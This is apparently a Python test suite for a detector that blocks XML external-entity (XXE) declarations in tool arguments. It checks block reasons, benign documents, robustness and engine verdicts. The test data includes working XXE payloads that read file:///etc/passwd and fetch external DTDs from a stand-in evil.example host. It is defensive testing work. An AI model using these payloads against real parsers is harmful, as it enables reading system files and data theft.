"""XXE guard: block XML external-entity declarations in arguments.

Covers the BLOCK contract (the offending arg is named in the reason), the allow
path (an ordinary document gets no opinion), each declaration the pattern
declares, non-string and non-dict input that must be skipped rather than
crashed on, and end-to-end verdicts through the engine.
"""
from interlock import PolicyEngine, SensorEvent, Verdict
from interlock.detectors.xxe_guard import PATTERN, POLICY_ID, xxe_guard


def _event(**args):
    return SensorEvent(action="parse_xml", args=args)


# --- the block path ---------------------------------------------------------


def test_external_entity_declaration_is_blocked():
    payload = '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
    decision = xxe_guard()(_event(doc=payload))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID


def test_block_reason_names_the_offending_argument():
    payload = '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
    decision = xxe_guard()(_event(doc=payload))
    assert decision is not None
    assert decision.reason == "xxe: doc"


def test_reason_names_whichever_argument_matched():
    payload = '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'
    decision = xxe_guard()(_event(xml_text=payload))
    assert decision is not None
    assert decision.reason == "xxe: xml_text"


def test_first_matching_argument_wins():
    decision = xxe_guard()(
        _event(first='<!ENTITY a SYSTEM "file:///a">', second='<!DOCTYPE b [')
    )
    assert decision is not None
    assert decision.reason == "xxe: first"


# --- each declaration the pattern declares ----------------------------------


def test_each_declared_xxe_form_is_blocked():
    payloads = (
        '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>',  # internal subset
        '<!ENTITY e SYSTEM "file:///etc/passwd">',                # bare entity, file
        '<!ENTITY xxe SYSTEM "http://evil.example/x">',           # bare entity, http
        '<!DOCTYPE foo [',                                        # internal subset opening
        '<!ENTITY lol "lol">',                                    # plain entity declaration
    )
    guard = xxe_guard()
    for payload in payloads:
        decision = guard(_event(doc=payload))
        assert decision is not None, payload
        assert decision.verdict is Verdict.BLOCK, payload


def test_parameter_entity_is_blocked():
    # A parameter-entity declaration smuggled through the internal subset.
    payload = '<!DOCTYPE x [<!ENTITY % p SYSTEM "http://evil.example/dtd"> %p;]>'
    decision = xxe_guard()(_event(doc=payload))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK


# --- the allow path ---------------------------------------------------------


def test_ordinary_document_gets_no_opinion():
    assert xxe_guard()(_event(doc="<note><to>Amir</to></note>")) is None


def test_document_with_declaration_but_no_doctype_gets_no_opinion():
    assert xxe_guard()(_event(doc='<?xml version="1.0"?><note/>')) is None


def test_clean_multi_argument_call_gets_no_opinion():
    guard = xxe_guard()
    assert guard(_event(doc="<note/>", encoding="utf-8")) is None


def test_empty_args_get_no_opinion():
    assert xxe_guard()(SensorEvent(action="parse_xml", args={})) is None


# --- robustness: skip what it cannot handle, never raise --------------------


def test_non_str_values_are_skipped_without_crashing():
    guard = xxe_guard()
    assert guard(_event(doc=None, depth=3)) is None
    assert guard(_event(options={"doc": '<!DOCTYPE x ['})) is None
    assert guard(_event(docs=['<!DOCTYPE x ['])) is None


def test_non_dict_args_get_no_opinion():
    assert xxe_guard()(SensorEvent(action="parse_xml", args=None)) is None
    assert xxe_guard()(SensorEvent(action="parse_xml", args="<note/>")) is None


def test_a_non_str_sibling_does_not_mask_a_real_match():
    # The int must be skipped, not abort the scan before "doc" is reached.
    decision = xxe_guard()(_event(depth=3, doc='<!DOCTYPE x ['))
    assert decision is not None
    assert decision.verdict is Verdict.BLOCK


# --- constants --------------------------------------------------------------


def test_exposed_constants():
    assert POLICY_ID == "xxe"
    assert PATTERN.search('<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>') is not None
    assert PATTERN.search("<note><to>Amir</to></note>") is None


# --- end to end through the engine ------------------------------------------


def test_engine_blocks_malicious_and_allows_benign():
    engine = PolicyEngine(rules=[xxe_guard()])

    malicious = SensorEvent(
        action="parse_xml",
        args={"doc": '<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>'},
    )
    decision = engine.evaluate(malicious)
    assert decision.verdict is Verdict.BLOCK
    assert decision.policy_id == POLICY_ID

    benign = SensorEvent(action="parse_xml", args={"doc": "<note><to>Amir</to></note>"})
    assert engine.evaluate(benign).verdict is Verdict.ALLOW
